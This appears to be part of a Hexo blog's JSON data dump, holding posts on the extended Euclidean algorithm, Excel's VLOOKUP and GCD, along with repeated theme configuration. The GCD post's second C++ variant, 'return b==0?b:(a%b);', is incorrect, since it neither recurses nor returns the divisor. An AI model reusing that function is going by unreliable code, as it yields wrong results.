id=\"more\"></a></p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">ll <span class=\"title\">exgcd</span><span class=\"params\">(ll a,ll b,ll &amp;x,ll &amp;y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        x=<span class=\"number\">1</span>,y=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ll res=exgcd(b,a%b,y,x);</span><br><span class=\"line\">        y-=x*(a/b);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":175,"excerpt":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>未完待续</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>未完待续<br>","more":"</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">ll <span class=\"title\">exgcd</span><span class=\"params\">(ll a,ll b,ll &amp;x,ll &amp;y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        x=<span class=\"number\">1</span>,y=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ll res=exgcd(b,a%b,y,x);</span><br><span class=\"line\">        y-=x*(a/b);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Excel函数用法","date":"2019-06-27T06:18:41.000Z","abbrlink":"bd210d73","_content":"# VLOOKUP\n**用途**：搜索表区域首列满足条件的元素，确定待检索单元格在区域中的行序号，再进一步返回选定单元格的值。默认情况下，表是以升序排序的。\n\n**用法**：\n\n| 参数 | 含义 |\n|:-|:-|\n|lookup_value|搜索条件|\n|table_array|搜索区域|\n|col_index_num|待返回单元格在搜索区域中的列序号|\n|range_lookup|匹配模式【可选】|\n\n**示例**：\n```\n=VLOOKUP(A2,sheet1!$B2:$O50,3,FALSE)\n```\n","source":"_posts/Excel函数.md","raw":"---\ntitle: Excel函数用法\ndate: 2019-06-27 14:18:41\ncategories:\n  - 软件\n  - Excel\nabbrlink: bd210d73\n---\n# VLOOKUP\n**用途**：搜索表区域首列满足条件的元素，确定待检索单元格在区域中的行序号，再进一步返回选定单元格的值。默认情况下，表是以升序排序的。\n\n**用法**：\n\n| 参数 | 含义 |\n|:-|:-|\n|lookup_value|搜索条件|\n|table_array|搜索区域|\n|col_index_num|待返回单元格在搜索区域中的列序号|\n|range_lookup|匹配模式【可选】|\n\n**示例**：\n```\n=VLOOKUP(A2,sheet1!$B2:$O50,3,FALSE)\n```\n","slug":"Excel函数","published":1,"updated":"2020-05-11T09:37:55.263Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkaq000uqse57j8273ax","content":"<h1 id=\"VLOOKUP\"><a href=\"#VLOOKUP\" class=\"headerlink\" title=\"VLOOKUP\"></a>VLOOKUP</h1><p><strong>用途</strong>：搜索表区域首列满足条件的元素，确定待检索单元格在区域中的行序号，再进一步返回选定单元格的值。默认情况下，表是以升序排序的。</p>\n<p><strong>用法</strong>：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">参数</th>\n<th style=\"text-align:left\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">lookup_value</td>\n<td style=\"text-align:left\">搜索条件</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">table_array</td>\n<td style=\"text-align:left\">搜索区域</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">col_index_num</td>\n<td style=\"text-align:left\">待返回单元格在搜索区域中的列序号</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">range_lookup</td>\n<td style=\"text-align:left\">匹配模式【可选】</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p><strong>示例</strong>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x3D;VLOOKUP(A2,sheet1!$B2:$O50,3,FALSE)</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":203,"excerpt":"","more":"<h1 id=\"VLOOKUP\"><a href=\"#VLOOKUP\" class=\"headerlink\" title=\"VLOOKUP\"></a>VLOOKUP</h1><p><strong>用途</strong>：搜索表区域首列满足条件的元素，确定待检索单元格在区域中的行序号，再进一步返回选定单元格的值。默认情况下，表是以升序排序的。</p>\n<p><strong>用法</strong>：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">参数</th>\n<th style=\"text-align:left\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">lookup_value</td>\n<td style=\"text-align:left\">搜索条件</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">table_array</td>\n<td style=\"text-align:left\">搜索区域</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">col_index_num</td>\n<td style=\"text-align:left\">待返回单元格在搜索区域中的列序号</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">range_lookup</td>\n<td style=\"text-align:left\">匹配模式【可选】</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p><strong>示例</strong>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x3D;VLOOKUP(A2,sheet1!$B2:$O50,3,FALSE)</span><br></pre></td></tr></table></figure></p>\n"},{"title":"GCD","date":"2019-03-29T09:11:09.000Z","abbrlink":"2071db18","updated":"2020-05-11T09:47:25.030Z","_content":"# 原理\n欧几里得算法据说是最早的算法，用于计算最大公约数，也是数论的基础算法之一。\n# 题目\n51Nod 1011：https://www.51nod.com/onlineJudge/questionCode.html#!problemId=1011\n<!--more-->\n# 代码\n```cpp\nint gcd(int a,int b)\n{\n    if(b==0)return a;\n    return gcd(b,a%b);\n}\n```\n```cpp\nint gcd(int a,int b)\n{\n    return b==0?b:(a%b);\n}\n```\n\n# 延伸\n扩展欧几里得","source":"_posts/GCD.md","raw":"---\ntitle: GCD\ndate: 2019-03-29 17:11:09\ncategories:\n  - Algorithm\ntags:\n  - GCD\nabbrlink: 2071db18\nupdated:\n---\n# 原理\n欧几里得算法据说是最早的算法，用于计算最大公约数，也是数论的基础算法之一。\n# 题目\n51Nod 1011：https://www.51nod.com/onlineJudge/questionCode.html#!problemId=1011\n<!--more-->\n# 代码\n```cpp\nint gcd(int a,int b)\n{\n    if(b==0)return a;\n    return gcd(b,a%b);\n}\n```\n```cpp\nint gcd(int a,int b)\n{\n    return b==0?b:(a%b);\n}\n```\n\n# 延伸\n扩展欧几里得","slug":"GCD","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkas000xqse56i5b2e3g","content":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>欧几里得算法据说是最早的算法，用于计算最大公约数，也是数论的基础算法之一。</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>51Nod 1011：<a href=\"https://www.51nod.com/onlineJudge/questionCode.html#!problemId=1011\">https://www.51nod.com/onlineJudge/questionCode.html#!problemId=1011</a><br><a id=\"more\"></a></p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">gcd</span><span class=\"params\">(<span class=\"keyword\">int</span> a,<span class=\"keyword\">int</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>)<span class=\"keyword\">return</span> a;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> gcd(b,a%b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">gcd</span><span class=\"params\">(<span class=\"keyword\">int</span> a,<span class=\"keyword\">int</span> b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> b==<span class=\"number\">0</span>?b:(a%b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"延伸\"><a href=\"#延伸\" class=\"headerlink\" title=\"延伸\"></a>延伸</h1><p>扩展欧几里得</p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"